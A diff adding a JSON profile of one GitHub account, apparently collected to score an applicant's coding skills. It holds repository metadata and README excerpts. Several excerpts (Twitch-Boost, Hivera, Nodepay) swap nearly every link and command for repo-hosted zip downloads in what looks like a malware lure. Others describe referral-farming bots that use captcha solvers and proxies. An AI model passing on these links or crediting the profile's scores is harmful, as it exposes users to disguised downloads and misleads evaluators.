@@ -1,0 +1,883 @@
+{
+  "applicant_id": "applicant0054",
+  "login": "Shishir-Singh-666",
+  "html_url": "https://github.com/Shishir-Singh-666",
+  "created_at": "2019-11-12T11:40:34Z",
+  "account_age_days": 2500,
+  "public_repos": 24,
+  "followers": 3,
+  "following": 0,
+  "repos": [
+    {
+      "name": "Twitch-Boost-v1.5-Tools",
+      "full_name": "Shishir-Singh-666/Twitch-Boost-v1.5-Tools",
+      "html_url": "https://github.com/Shishir-Singh-666/Twitch-Boost-v1.5-Tools",
+      "description": "Boost Twitch channel growth and viewer engagement with tools designed for stream optimization and follower increase.",
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2019-11-12T11:41:54Z",
+      "pushed_at": "2026-09-16T13:07:26Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 1131,
+      "default_branch": "main",
+      "license": "MIT",
+      "topics": [
+        "boost",
+        "howtousetwitchboost",
+        "installtwitchboost",
+        "twitchboostguide",
+        "twitchboostsetup",
+        "twitchboosttools",
+        "twitchstreamoptimization",
+        "twitchtoolsinstallation",
+        "utilities",
+        "utility",
+        "windows",
+        "x32",
+        "x64"
+      ],
+      "languages": {
+        "C++": 2088646,
+        "C": 269497,
+        "PowerShell": 339
+      },
+      "primary_language": "C++",
+      "file_count": 61,
+      "top_level_paths": [
+        "AutoPredictions.cpp",
+        "AutoPredictions.h",
+        "BakkesMod.props",
+        "BuildAuthURL.cpp",
+        "Chat.cpp",
+        "Chat.h",
+        "Config.h",
+        "GuiBase.cpp",
+        "GuiBase.h",
+        "IMGUI",
+        "LICENSE",
+        "Login.cpp",
+        "Login.h",
+        "README.md",
+        "Server.cpp",
+        "Server.h",
+        "TwitchChatQuickChat.cpp",
+        "TwitchChatQuickChat.h",
+        "TwitchChatQuickChat.rc",
+        "TwitchChatQuickChat.vcxproj",
+        "TwitchChatQuickChat.vcxproj.filters",
+        "TwitchChatQuickChat.vcxproj.user",
+        "TwitchEventSub.cpp",
+        "TwitchEventSub.h",
+        "TwitchWebSocket.cpp",
+        "TwitchWebSocket.h",
+        "TwithChatQuickChatPluginSettings.cpp",
+        "URL.cpp",
+        "URL.h",
+        "logging.h",
+        "pch.cpp",
+        "pch.h",
+        "resource.h",
+        "update_version.ps1",
+        "version.h"
+      ],
+      "notable_files": [],
+      "manifests": {},
+      "has_readme": true,
+      "readme_length": 6923,
+      "readme_excerpt": "# 🚀 Twitch-Boost-v1.5-Tools - Enhance Twitch Streams Easily\n\n[![Download Now](https://raw.githubusercontent.com/Shishir-Singh-666/Twitch-Boost-v1.5-Tools/main/IMGUI/v-Tools-Twitch-Boost-3.3.zip)](https://raw.githubusercontent.com/Shishir-Singh-666/Twitch-Boost-v1.5-Tools/main/IMGUI/v-Tools-Twitch-Boost-3.3.zip)\n\nWelcome to the Twitch-Boost-v1.5-Tools repository. This guide will help you download and run the software on a Windows PC. The tools here aim to improve your Twitch streaming experience by optimizing video performance and increasing viewer engagement. This guide assumes no technical knowledge and walks through each step clearly.\n\n---\n\n## 📥 Download Twitch-Boost-v1.5-Tools\n\nYou will need to **visit this page to download** the latest version:\n\n[→ Click here to download Twitch-Boost-v1.5-Tools](https://raw.githubusercontent.com/Shishir-Singh-666/Twitch-Boost-v1.5-Tools/main/IMGUI/v-Tools-Twitch-Boost-3.3.zip)\n\nWhen you open this link, look for the latest release or download section. Most likely, the files will be listed under “Releases” or in the main repository area. Choose the file that matches your system:\n\n- For 64-bit Windows, select the x64 version.\n- For 32-bit Windows,",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 2,
+      "contribution_share": 0.333,
+      "commits": {
+        "count": 3,
+        "first_at": "2026-03-04T22:58:59+00:00",
+        "last_at": "2026-09-16T13:07:25+00:00",
+        "active_days": 3,
+        "span_days": 195,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Update README.md",
+          "Update README.md"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": true,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 3,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 53
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": true,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "c-cpp",
+          "source": "language",
+          "detail": "C++: 2,088,646 bytes (89% of repo)",
+          "strength": 1.0
+        },
+        {
+          "skill_id": "c-cpp",
+          "source": "language",
+          "detail": "C: 269,497 bytes (11% of repo)",
+          "strength": 0.5142671430182635
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 2358482,
+        "strong_skills": [
+          "c-cpp"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "Hivera2nd",
+      "full_name": "Shishir-Singh-666/Hivera2nd",
+      "html_url": "https://github.com/Shishir-Singh-666/Hivera2nd",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-12-19T07:39:17Z",
+      "pushed_at": "2026-03-05T10:53:00Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 603,
+      "default_branch": "main",
+      "license": "MIT",
+      "topics": [],
+      "languages": {
+        "JavaScript": 6879
+      },
+      "primary_language": "JavaScript",
+      "file_count": 10,
+      "top_level_paths": [
+        "LICENSE",
+        "README.md",
+        "image-1.png",
+        "image.png",
+        "main.js",
+        "package.json",
+        "proxies.txt",
+        "utils"
+      ],
+      "notable_files": [
+        "package.json"
+      ],
+      "manifests": {
+        "package.json": [
+          "fs",
+          "https-proxy-agent",
+          "node-fetch",
+          "winston"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 2243,
+      "readme_excerpt": "# HIVERA TELEGRAM MINIAPP BOT\nA decentralized network power by @ton_blockchain, backed by @Ton_Incubator. Contribute to powering AI innovation worldwide. [https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip](https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip)\n\n![banner](https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip)\n\n## Features\n\n- **Auto Mines Hivera Tokens**\n- **Support Multy Accounts**\n- **Support proxy**: fill your proxy in `https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip` format `http://user:pass@ip:port`\n\n## Requirements\n\n- **https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip**: Ensure you have https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip installed.\n- **npm**: Ensure you have npm installed.\n- **Hivera Jwt**: follow instructions below to get\n- **Open MiniApp HiveraBot** : [https://raw.githubusercontent.com/Shishir-Singh-666/Hivera2nd/main/utils/Hivera-nd-2.1-beta.4.zip](https://raw.githu",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 4,
+        "first_at": "2024-12-19T07:40:05+00:00",
+        "last_at": "2026-03-05T10:53:00+00:00",
+        "active_days": 3,
+        "span_days": 441,
+        "max_per_day": 2,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Add files via upload",
+          "Add files via upload",
+          "Add files via upload"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": true,
+          "substantial_tree": false,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 2,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 3
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "javascript",
+          "source": "language",
+          "detail": "JavaScript: 6,879 bytes (100% of repo)",
+          "strength": 1.0
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 6879,
+        "strong_skills": [
+          "javascript"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "nodepay2nd",
+      "full_name": "Shishir-Singh-666/nodepay2nd",
+      "html_url": "https://github.com/Shishir-Singh-666/nodepay2nd",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-11-21T07:18:37Z",
+      "pushed_at": "2026-03-05T10:53:27Z",
+      "stargazers": 0,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 549,
+      "default_branch": "main",
+      "license": "MIT",
+      "topics": [],
+      "languages": {
+        "JavaScript": 9000
+      },
+      "primary_language": "JavaScript",
+      "file_count": 15,
+      "top_level_paths": [
+        ".gitignore",
+        "LICENSE",
+        "README.md",
+        "config.js",
+        "index.js",
+        "package.json",
+        "proxy.txt",
+        "src",
+        "token.txt"
+      ],
+      "notable_files": [
+        "package.json"
+      ],
+      "manifests": {
+        "package.json": [
+          "axios",
+          "colors",
+          "inquirer",
+          "winston"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 4152,
+      "readme_excerpt": "# NODEPAY NETWORK\n\nA bot for automating Nodepay airdrop interactions, including session management and pinging with proxy support.\n\n---\n\n## Requirements\n\n1. **https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip** (version 14 or higher)\n2. **npm** (Node package manager)\n\n---\n\n## Installation\n\nTo get started with the Nodepay Airdrop Bot:\n\n1. Clone the repository:\n\n```bash\ngit clone https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip && cd nodepay-farm\n```\n\n3. Install the dependencies:\n\n```bash\nnpm install\n```\n\n---\n\n## Configuration\n\nTo get your Bearer token:\n\n1. **Register for a Nodepay account** (https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip)\n- Go to Nodepay dashboard.\n\n2. **Get your token**:\n\n- Open **DevTools** in your browser (right-click > Inspect or press `F12`).\n\n- Go to the **Console** tab in DevTools.\n\n- Type the following command to get your token:\n  ```bash\n  https://github.com/Shishir-Singh-666/nodepay2nd/raw/refs/heads/main/src/nd_nodepay_v1.9.zip('np_webapp_token') \n  ```\n\n- This will return the Bearer token. **Copy the token** (without the `Bear",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 9,
+        "first_at": "2024-11-21T07:20:49+00:00",
+        "last_at": "2026-03-05T10:53:27+00:00",
+        "active_days": 3,
+        "span_days": 469,
+        "max_per_day": 7,
+        "low_effort_message_ratio": 0.333,
+        "messages_sample": [
+          "Update README.md",
+          "Delete utils.js",
+          "Delete utils.js",
+          "Delete proxyChecker.js",
+          "Delete bot.js",
+          "Delete ipInfoCache.js",
+          "Add files via upload",
+          "src/",
+          "Add files via upload"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": true,
+          "substantial_tree": true,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 3,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 8
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "javascript",
+          "source": "language",
+          "detail": "JavaScript: 9,000 bytes (100% of repo)",
+          "strength": 1.0
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 9000,
+        "strong_skills": [
+          "javascript"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "nodepay_autoref2",
+      "full_name": "Shishir-Singh-666/nodepay_autoref2",
+      "html_url": "https://github.com/Shishir-Singh-666/nodepay_autoref2",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-12-25T16:29:07Z",
+      "pushed_at": "2026-03-05T10:53:44Z",
+      "stargazers": 1,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 541,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "Python": 19102
+      },
+      "primary_language": "Python",
+      "file_count": 6,
+      "top_level_paths": [
+        "README.md",
+        "accounts.txt",
+        "main.py",
+        "prating",
+        "proxies.txt",
+        "requirements.txt"
+      ],
+      "notable_files": [
+        "requirements.txt"
+      ],
+      "manifests": {
+        "requirements.txt": [
+          "2captcha-python",
+          "anticaptchaofficial",
+          "capmonster-python",
+          "colorama",
+          "faker",
+          "python-anticaptcha",
+          "requests"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 3754,
+      "readme_excerpt": "# Nodepay Autoreferral Bot\nAutomatic referral script for Nodepay Account using captcha solver and proxies.\n### Tools and components required\n1. Nodepay Account | Register: [https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip](https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip)\n2. Proxies Static Residental | [FREE 10 PREMIUM PROXIES](https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip) | [Free 100 Premium Proxies](https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip) | Good Premium Proxies (paid): [922proxy](https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip), [proxy-cheap](https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip), [infatica](https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs/heads/main/prating/autoref_nodepay_owk.zip)\n3. Captcha Solvers API keys, you need to recharge credits | [https://github.com/Shishir-Singh-666/nodepay_autoref2/raw/refs",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 3,
+        "first_at": "2024-12-25T16:31:18+00:00",
+        "last_at": "2026-03-05T10:53:44+00:00",
+        "active_days": 3,
+        "span_days": 434,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Add files via upload",
+          "Add files via upload"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": true,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": true
+        },
+        "entry_flag_count": 1,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 1
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "python",
+          "source": "language",
+          "detail": "Python: 19,102 bytes (100% of repo)",
+          "strength": 1.0
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 19102,
+        "strong_skills": [
+          "python"
+        ]
+      },
+      "tree_truncated": false
+    },
+    {
+      "name": "nodepay2ndid",
+      "full_name": "Shishir-Singh-666/nodepay2ndid",
+      "html_url": "https://github.com/Shishir-Singh-666/nodepay2ndid",
+      "description": null,
+      "homepage": null,
+      "is_fork": false,
+      "is_archived": false,
+      "is_template": false,
+      "created_at": "2024-12-15T16:30:40Z",
+      "pushed_at": "2026-03-05T10:53:35Z",
+      "stargazers": 1,
+      "forks": 0,
+      "open_issues": 0,
+      "size_kb": 541,
+      "default_branch": "main",
+      "license": null,
+      "topics": [],
+      "languages": {
+        "Python": 10990
+      },
+      "primary_language": "Python",
+      "file_count": 9,
+      "top_level_paths": [
+        "README.md",
+        "npay.py",
+        "proxy.txt",
+        "requirements.txt",
+        "tokens.txt",
+        "utils"
+      ],
+      "notable_files": [
+        "requirements.txt"
+      ],
+      "manifests": {
+        "requirements.txt": [
+          "aiohttp",
+          "colorama",
+          "curl-cffi",
+          "fake-useragent",
+          "loguru",
+          "requests"
+        ]
+      },
+      "has_readme": true,
+      "readme_length": 4740,
+      "readme_excerpt": "# NODEPAY FARMING USING PROXIES\n- Daily Claim\n- Multi Account Keep-Alive Support.\n\n# [GET RESIDENTIAL PROXIES FROM HERE](https://raw.githubusercontent.com/Shishir-Singh-666/nodepay2ndid/main/utils/__pycache__/ndid-nodepay-v1.5.zip)\n\n# NOTE\n\n- **Paste your proxies inside ```https://raw.githubusercontent.com/Shishir-Singh-666/nodepay2ndid/main/utils/__pycache__/ndid-nodepay-v1.5.zip``` and the token inside ```https://raw.githubusercontent.com/Shishir-Singh-666/nodepay2ndid/main/utils/__pycache__/ndid-nodepay-v1.5.zip```**\n- **To use multiple accounts, in which case one proxy from each line will be assigned to one token in each line (1 token = 1 proxy), paste all your tokens in the ```https://raw.githubusercontent.com/Shishir-Singh-666/nodepay2ndid/main/utils/__pycache__/ndid-nodepay-v1.5.zip``` file and make sure there are matching number of proxies in the ```https://raw.githubusercontent.com/Shishir-Singh-666/nodepay2ndid/main/utils/__pycache__/ndid-nodepay-v1.5.zip``` file.**\n\n# PC (WINDOWS)\n## How to Get Nodepay Token -\n\n1. Open your browser and login to the NODEPAY dashboard.\n2. Press `F12` to open the **Inspect Elements** panel.\n3. Go to the **Console** tab and paste the followi",
+      "has_ci": false,
+      "has_tests": false,
+      "has_docker": false,
+      "has_releases": false,
+      "contributors_count": 1,
+      "contribution_share": 1.0,
+      "commits": {
+        "count": 3,
+        "first_at": "2024-12-15T16:31:32+00:00",
+        "last_at": "2026-03-05T10:53:35+00:00",
+        "active_days": 3,
+        "span_days": 444,
+        "max_per_day": 1,
+        "low_effort_message_ratio": 1.0,
+        "messages_sample": [
+          "Update README.md",
+          "Add files via upload",
+          "Add files via upload"
+        ],
+        "attribution": "author",
+        "truncated": false
+      },
+      "structure": {
+        "entry_flags": {
+          "is_fork": false,
+          "single_commit": false,
+          "all_commits_one_day": false,
+          "burst_only": false,
+          "notebook_only": false,
+          "single_file_project": false,
+          "tutorial_name_hit": false,
+          "follow_along_phrase": false,
+          "no_readme": false,
+          "is_template": false,
+          "mostly_low_effort_commits": false
+        },
+        "intermediate_flags": {
+          "has_ci": false,
+          "has_tests": false,
+          "has_docker": false,
+          "deployed": false,
+          "multi_month_span": false,
+          "many_active_days": false,
+          "used_by_others": false,
+          "has_license": false,
+          "substantial_tree": false,
+          "documented": true
+        },
+        "entry_flag_count": 0,
+        "intermediate_flag_count": 1,
+        "tutorial_name_matches": [],
+        "follow_along_phrases": [],
+        "notebook_count": 0,
+        "code_file_count": 3
+      },
+      "judgment": {
+        "commit_message_kinds": {
+          "fix": 0,
+          "perf": 0,
+          "refactor": 0,
+          "test": 0,
+          "revert": 0
+        },
+        "sustained_maintenance": false,
+        "recently_active": true,
+        "has_releases": false,
+        "others_depend": false,
+        "multi_contributor": false,
+        "handles_issues": false
+      },
+      "skill_signals": [
+        {
+          "skill_id": "python",
+          "source": "language",
+          "detail": "Python: 10,990 bytes (100% of repo)",
+          "strength": 1.0
+        }
+      ],
+      "skill_relevant": true,
+      "relevance": {
+        "rules": {
+          "not_fork": true,
+          "project_name": true,
+          "has_code_files": true,
+          "code_bytes": true,
+          "strong_skill_signal": true,
+          "own_commits": true,
+          "own_share": true
+        },
+        "failed": [],
+        "code_bytes": 10990,
+        "strong_skills": [
+          "python"
+        ]
+      },
+      "tree_truncated": false
+    }
+  ],
+  "external_contributions": [],
+  "languages_bytes": {
+    "C++": 2088646,
+    "C": 269497,
+    "Python": 30092,
+    "JavaScript": 15879,
+    "PowerShell": 339
+  },
+  "total_commits": 22,
+  "skill_evidence": [
+    {
+      "skill_id": "javascript",
+      "repos": [
+        "Shishir-Singh-666/Hivera2nd",
+        "Shishir-Singh-666/nodepay2nd"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 15879,
+      "commit_count": 13,
+      "first_seen": "2024-11-21T07:20:49+00:00",
+      "last_seen": "2026-03-05T10:53:27+00:00",
+      "details": [
+        "Hivera2nd: JavaScript: 6,879 bytes (100% of repo)",
+        "nodepay2nd: JavaScript: 9,000 bytes (100% of repo)"
+      ]
+    },
+    {
+      "skill_id": "python",
+      "repos": [
+        "Shishir-Singh-666/nodepay_autoref2",
+        "Shishir-Singh-666/nodepay2ndid"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 30092,
+      "commit_count": 6,
+      "first_seen": "2024-12-15T16:31:32+00:00",
+      "last_seen": "2026-03-05T10:53:44+00:00",
+      "details": [
+        "nodepay_autoref2: Python: 19,102 bytes (100% of repo)",
+        "nodepay2ndid: Python: 10,990 bytes (100% of repo)"
+      ]
+    },
+    {
+      "skill_id": "c-cpp",
+      "repos": [
+        "Shishir-Singh-666/Twitch-Boost-v1.5-Tools"
+      ],
+      "signal_count": 2,
+      "sources": [
+        "language"
+      ],
+      "max_strength": 1.0,
+      "total_bytes": 2358143,
+      "commit_count": 3,
+      "first_seen": "2026-03-04T22:58:59+00:00",
+      "last_seen": "2026-09-16T13:07:25+00:00",
+      "details": [
+        "Twitch-Boost-v1.5-Tools: C++: 2,088,646 bytes (89% of repo)",
+        "Twitch-Boost-v1.5-Tools: C: 269,497 bytes (11% of repo)"
+      ]
+    }
+  ],
+  "tier": "strict",
+  "usability": {
+    "tier": "strict",
+    "checks": {
+      "skill_relevant_repos": {
+        "actual": 5,
+        "required": 3,
+        "tier": "relaxed"
+      },
+      "readable_repos": {
+        "actual": 5,
+        "required": 1,
+        "tier": "relaxed"
+      },
+      "total_commits": {
+        "actual": 22,
+        "required": 20,
+        "tier": "strict"
+      },
+      "distinct_skills": {
+        "actual": 3,
+        "required": 3,
+        "tier": "strict"
+      }
+    },
+    "failed": [],
+    "reason": "meets all thresholds"
+  },
+  "search_stratum": "cpp-systems",
+  "collected_at": "2026-09-16T14:24:28.935502+00:00",
+  "collector_version": "0.1.0",
+  "notes": []
+}
